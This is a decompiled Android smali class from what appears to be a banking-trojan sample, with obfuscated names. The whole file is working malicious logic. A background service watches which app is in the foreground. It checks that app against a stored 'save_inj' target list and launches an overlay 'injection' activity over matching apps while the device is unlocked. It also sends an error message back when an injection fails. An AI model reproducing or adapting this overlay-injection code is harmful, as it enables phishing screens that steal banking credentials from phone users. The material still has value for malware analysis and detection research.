.class public Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;
.super Landroid/app/IntentService;


# instance fields
.field a:Lwocwvy/czyxoxmbauu/slsa/b;

.field b:Landroid/content/Context;

.field c:Lwocwvy/czyxoxmbauu/slsa/c;


# direct methods
.method public constructor <init>()V
    .locals 1

    const-string v0, ""

    invoke-direct {p0, v0}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/b;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/c;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/c;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->c:Lwocwvy/czyxoxmbauu/slsa/c;

    return-void
.end method

.method private b()Ljava/util/ArrayList;
    .locals 5
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/util/ArrayList<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x13

    const/4 v3, 0x0

    if-gt v1, v2, :cond_0

    const-string v1, "activity"

    invoke-virtual {p0, v1}, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/ActivityManager;

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Landroid/app/ActivityManager;->getRunningTasks(I)Ljava/util/List;

    move-result-object v1

    invoke-interface {v1, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/app/ActivityManager$RunningTaskInfo;

    iget-object v2, v2, Landroid/app/ActivityManager$RunningTaskInfo;->topActivity:Landroid/content/ComponentName;

    invoke-interface {v1, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/ActivityManager$RunningTaskInfo;

    iget-object v1, v1, Landroid/app/ActivityManager$RunningTaskInfo;->topActivity:Landroid/content/ComponentName;

    invoke-virtual {v1}, Landroid/content/ComponentName;->getPackageName()Ljava/lang/String;

    move-result-object v1

    :goto_0
    invoke-virtual {v0, v1}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    return-object v0

    :cond_0
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v4, 0x15

    if-le v1, v2, :cond_1

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    if-gt v1, v4, :cond_1

    const-string v1, "activity"

    invoke-virtual {p0, v1}, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/ActivityManager;

    invoke-virtual {v1}, Landroid/app/ActivityManager;->getRunningAppProcesses()Ljava/util/List;

    move-result-object v1

    invoke-interface {v1, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/ActivityManager$RunningAppProcessInfo;

    iget-object v1, v1, Landroid/app/ActivityManager$RunningAppProcessInfo;->processName:Ljava/lang/String;

    goto :goto_0

    :cond_1
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    if-le v1, v4, :cond_3

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x17

    if-gt v1, v2, :cond_3

    invoke-static {p0}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/b/h;->a(Landroid/content/Context;)Ljava/util/List;

    move-result-object v0

    new-instance v1, Ljava/util/ArrayList;

    invoke-direct {v1}, Ljava/util/ArrayList;-><init>()V

    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :goto_1
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_2

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/b/g;

    invoke-virtual {v2}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/b/g;->d()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto :goto_1

    :cond_2
    return-object v1

    :cond_3
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x18

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->b:Landroid/content/Context;

    invoke-virtual {v1, v2}, Lwocwvy/czyxoxmbauu/slsa/b;->j(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    goto :goto_0
.end method


# virtual methods
.method a()V
    .locals 10

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v1, "Start"

    const-string v2, "apiProc"

    invoke-virtual {v0, v1, v2}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->b:Landroid/content/Context;

    const-string v2, "save_inj"

    invoke-virtual {v0, v1, v2}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    move-object v2, v0

    const/4 v0, 0x0

    :cond_0
    :goto_0
    if-nez v0, :cond_1

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->b:Landroid/content/Context;

    const-string v4, "save_inj"

    invoke-virtual {v2, v3, v4}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->length()I

    move-result v3

    const/4 v4, 0x4

    if-gt v3, v4, :cond_1

    invoke-virtual {p0}, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->stopSelf()V

    return-void

    :cond_1
    const/16 v3, 0x28

    if-lt v0, v3, :cond_2

    const/4 v0, -0x1

    :cond_2
    const/4 v3, 0x1

    add-int/2addr v0, v3

    iget-object v4, p0, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v4, p0}, Lwocwvy/czyxoxmbauu/slsa/b;->g(Landroid/content/Context;)Z

    move-result v4

    if-eqz v4, :cond_3

    invoke-virtual {p0}, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->stopSelf()V

    :cond_3
    iget-object v4, p0, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->b:Landroid/content/Context;

    const-string v4, "keyguard"

    invoke-virtual {p0, v4}, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/app/KeyguardManager;

    invoke-virtual {v4}, Landroid/app/KeyguardManager;->inKeyguardRestrictedInputMode()Z

    move-result v4

    const-wide/16 v5, 0xa

    if-nez v4, :cond_8

    const-string v4, ""

    if-eq v2, v4, :cond_0

    iget-object v4, p0, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v7, p0, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->b:Landroid/content/Context;

    invoke-virtual {v4, v7}, Lwocwvy/czyxoxmbauu/slsa/b;->o(Landroid/content/Context;)Z

    move-result v4

    if-eqz v4, :cond_0

    :try_start_0
    sget-object v4, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-virtual {v4, v5, v6}, Ljava/util/concurrent/TimeUnit;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v4

    invoke-virtual {v4}, Ljava/lang/InterruptedException;->printStackTrace()V

    :goto_1
    invoke-direct {p0}, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->b()Ljava/util/ArrayList;

    move-result-object v4

    const/4 v5, 0x0

    iget-object v6, p0, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v7, "App"

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, ""

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v7, v8}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    move-object v6, v5

    const/4 v5, 0x0

    :goto_2
    const-string v7, "/"

    invoke-virtual {v2, v7}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v7

    array-length v7, v7

    if-ge v5, v7, :cond_7

    const-string v7, "/"

    invoke-virtual {v2, v7}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v7

    aget-object v7, v7, v5

    const-string v8, ","

    invoke-virtual {v7, v8}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v7

    const/4 v8, 0x1

    :goto_3
    array-length v9, v7

    if-ge v8, v9, :cond_5

    aget-object v9, v7, v8

    invoke-virtual {v4, v9}, Ljava/util/ArrayList;->contains(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_4

    aget-object v6, v7, v1

    goto :goto_4

    :cond_4
    add-int/lit8 v8, v8, 0x1

    goto :goto_3

    :cond_5
    :goto_4
    if-eqz v6, :cond_6

    goto :goto_5

    :cond_6
    add-int/lit8 v5, v5, 0x1

    goto :goto_2

    :cond_7
    :goto_5
    if-eqz v6, :cond_0

    iget-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->b:Landroid/content/Context;

    const-string v3, "keyguard"

    invoke-virtual {p0, v3}, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/app/KeyguardManager;

    invoke-virtual {v3}, Landroid/app/KeyguardManager;->inKeyguardRestrictedInputMode()Z

    move-result v3

    if-nez v3, :cond_0

    :try_start_1
    iget-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v4, p0, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->b:Landroid/content/Context;

    const-string v5, "name"

    invoke-virtual {v3, v4, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "true"

    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-nez v3, :cond_0

    new-instance v3, Landroid/content/Intent;

    const-class v4, Lwocwvy/czyxoxmbauu/slsa/ncec/pltrfi;

    invoke-direct {v3, p0, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v4, "str"

    invoke-virtual {v3, v4, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v3

    const/high16 v4, 0x10000000

    invoke-virtual {v3, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v4, 0x800000

    invoke-virtual {v3, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v4, 0x40000000    # 2.0f

    invoke-virtual {v3, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v3}, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->startActivity(Landroid/content/Intent;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto/16 :goto_0

    :catch_1
    iget-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v4, p0, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->b:Landroid/content/Context;

    const-string v5, "4"

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "p="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v7, p0, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v9, p0, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v9, p0}, Lwocwvy/czyxoxmbauu/slsa/b;->q(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v9, "|ERROR START INJECTIONS|"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Lwocwvy/czyxoxmbauu/slsa/b;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v4, v5, v6}, Lwocwvy/czyxoxmbauu/slsa/b;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    goto/16 :goto_0

    :cond_8
    :try_start_2
    sget-object v3, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-virtual {v3, v5, v6}, Ljava/util/concurrent/TimeUnit;->sleep(J)V
    :try_end_2
    .catch Ljava/lang/InterruptedException; {:try_start_2 .. :try_end_2} :catch_2

    goto/16 :goto_0

    :catch_2
    move-exception v3

    invoke-virtual {v3}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto/16 :goto_0
.end method

.method protected onHandleIntent(Landroid/content/Intent;)V
    .locals 3

    iput-object p0, p0, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->b:Landroid/content/Context;

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->b:Landroid/content/Context;

    const-string v1, "name"

    const-string v2, "false"

    invoke-virtual {p1, v0, v1, v2}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->b:Landroid/content/Context;

    const-string v1, "save_inj"

    invoke-virtual {p1, v0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result p1

    const/4 v0, 0x5

    if-gt p1, v0, :cond_0

    invoke-virtual {p0}, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->stopSelf()V

    :cond_0
    invoke-virtual {p0}, Lwocwvy/czyxoxmbauu/slsa/wfveenegvz;->a()V

    return-void
.end method
